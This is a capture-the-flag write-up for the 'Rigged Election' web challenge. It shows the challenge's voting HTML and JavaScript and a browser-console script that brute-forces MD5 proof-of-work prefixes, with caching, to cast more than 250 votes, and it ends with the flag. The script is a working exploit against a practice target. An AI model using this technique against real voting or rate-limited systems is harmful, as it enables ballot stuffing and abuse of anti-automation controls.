# X-MAS CTF 2019 – Rigged Election

* **Category:** web
* **Points:** 50

## Challenge

> Come one, come all! We've opened up a brand new website that allows the Lapland people to vote the next big town hall project! Just upload your ideas on the platform and vote using your CPU power. We've made sure voting takes a great amount of effort, so there's no easy way to play the system.
> 
> If you are indeed able to vote more than 250 times, you will be congratulated as an active Lapland citizen and receive a prize worthy of this title.
> 
> Remote server: http://challs.xmas.htsp.ro:11001
>
> Author: Milkdrop
>
> Note: The ideas you post are public and logged, posting any X-MAS flags may > disqualify your team
>
> Note 2: You must send all 250 votes from the same PHP session, otherwise the server will not be able to send you the flag.

## Solution

With the website you can submit an idea. An ID is assigned to that idea and the idea can be voted.

Here the HTML source.

```html
<head>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
	<div class="container">
		<div id="status" class="status invisible"></div>

		<img src="/img/idea.gif">
		<h1 class="head"> Idea Voting System </h1>
		<img src="/img/idea.gif">

		<h2><i>Submit your idea:</i></h2>
		<form style="padding-left: 35px" action="/" name="newIdea" method="post">
			<textarea maxlength="31" style="margin-right: 45px; margin-bottom: 5px; height: 25px" placeholder="Name" cols="30" rows ="1" name="name"></textarea><br>
			<textarea maxlength="255" placeholder="I think that we should do X, because Y ..." cols="30" rows ="5" name="idea"></textarea>
			<input class="submitButton" type="submit" value="">
		</form>

		<div class="idea special"><b class="name">name</b> / 123456 Points<div class="vote">
						<div class="agree" onclick="vote(16773, 1)">(I agree)</div> / 
						<div class="disagree" onclick="vote(16773, 0)">(I disagree)</div>
					</div><div class="ideaText">Idea text.</div></div>
		<footer>
			As seen on Good Morning America
		</footer>

		<script src="/md5.js"></script>
		<script src="/index.js"></script>
	</div>
</body>
```

The JavaScript into `index.js` is the following.

```javascript
function generateRandom (length) {
	var result = '';
	var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	var charactersLength = characters.length;

	for (var i = 0; i < length; i++)
		result += characters.charAt (Math.floor (Math.random () * charactersLength));

	return result;
}

function vote (id, upvote) {
	var xhttp = new XMLHttpRequest ();
	xhttp.open ("GET", "/vote.php?g=1", false);
	xhttp.send ();
	var work = xhttp.responseText;

	var statusElement = document.getElementById ("status");
	statusElement.className = "status";
	statusElement.innerText = "CPU Voting on Idea #" + id + " ...";

	var found = false;
	while (!found) {
		var randomLength = Math.floor (7 + Math.random () * 18);
		var stringGen = generateRandom (randomLength);
		var md5Gen = md5 ("watch__bisqwit__" + stringGen);

		if (md5Gen.substring (0, work.length).localeCompare (work) === 0) {
			var url = "/vote.php?id=" + id + "&h=" + stringGen;
			if (upvote === 1)
				url += "&u=1";

			xhttp.open ("GET", url, false);
			xhttp.send ();
			found = true;
		}
	}

	location.href = "/";
}
```

The voting procedure requires that a sort of challenge is returned by the server after the first request, i.e. `xhttp.open ("GET", "/vote.php?g=1", false);`, and then the client has to find a string which produces a MD5 hash with the first characters equals to the challenge. The challenge is different each time.

To reduce the time of finding correct strings, a smart voter can be implemented, using a cache and storing all failed attempts. With this trick, after ~14M  requests all strings will be found inside the cache, reducing the time of generation.

The exploit is the following.

```javascript
function wait(ms) {
    var d = new Date();
    var d2 = null;
    do {
        d2 = new Date(); 
    } while(d2-d < ms);
}

function voteSmart(id) {
    
    const cacheLimit = 90000000;
    var cacheElements = 0;
    var cache = new Map();
    
    console.log("Start voting.");
    var votes = 0
    while(votes <= 250) {
    
        console.log("Cookies: " + document.cookie);
    
        var xhttp = new XMLHttpRequest ();
        xhttp.open ("GET", "/vote.php?g=1", false);
        xhttp.send ();
        work = xhttp.responseText;
        console.log("Work to find is: " + work);
        
        stringGen = "";
        if(work in cache) {
            console.log("Cache hit!");
            stringGen = cache[work];
            wait(1000);
        } else {
         
            var found = false;
            while(!found) {
                var randomLength = Math.floor(7 + Math.random () * 18);
                stringGen = generateRandom(randomLength);
                var md5Gen = md5("watch__bisqwit__" + stringGen);
                var md5Subs = md5Gen.substring(0, work.length);
                
                if(cacheElements < cacheLimit && !(md5Subs in cache)) { // Updating cache at runtime.
                    cache[md5Subs] = stringGen;
                    cacheElements++;
                    if(cacheElements % 1000000 == 0) {
                        console.log("There are " + cacheElements + " cache elements.")
                    }
                }

                if(md5Subs.localeCompare(work) === 0) {
                    found = true;
                }
            }
        }
        
        var url = "/vote.php?id=" + id + "&h=" + stringGen + "&u=1";
        xhttp.open ("GET", url, false);
        xhttp.send ();
        voteResult = xhttp.responseText;
        votes++;
        console.log(votes + " > " + voteResult);
        
        if(voteResult.includes("X-MAS{")) {
            alert(voteResult);
            break;
        }
         
    }
}

voteSmart(23148);
```

You can launch the exploit script into the browser console and then refresh the page to get the flag.

```
X-MAS{NASA_aint_got_n0thin_on_m3}
```